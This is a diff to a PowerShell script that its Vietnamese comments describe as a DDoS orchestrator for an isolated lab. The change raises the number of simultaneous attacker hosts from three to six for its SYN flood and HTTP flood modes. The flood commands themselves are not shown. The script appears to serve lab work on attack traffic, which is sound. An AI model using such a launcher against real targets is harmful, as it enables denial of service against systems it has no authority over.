@@ -1,7 +1,7 @@
 # Orchestrator DDoS - chi dung trong lab co lap
 # Cach dung:
-#   .\run_ddos.ps1 syn      -> ca 3 attacker SYN flood dong loat
-#   .\run_ddos.ps1 http     -> ca 3 attacker HTTP flood dong loat
+#   .\run_ddos.ps1 syn      -> ca 6 attacker SYN flood dong loat
+#   .\run_ddos.ps1 http     -> ca 6 attacker HTTP flood dong loat
 param(
     [ValidateSet("syn","http")]
     [string]$mode = "syn",
@@ -9,7 +9,7 @@ param(
     [int]$duration = 30
 )
 
-$attackers = @("attacker1","attacker2","attacker3")
+$attackers = @("attacker1","attacker2","attacker3","attacker4","attacker5","attacker6")
 Write-Host "[*] Bat dau DDoS mode=$mode tu $($attackers.Count) nguon -> $target trong ${duration}s"
 
 $jobs = foreach ($a in $attackers) {
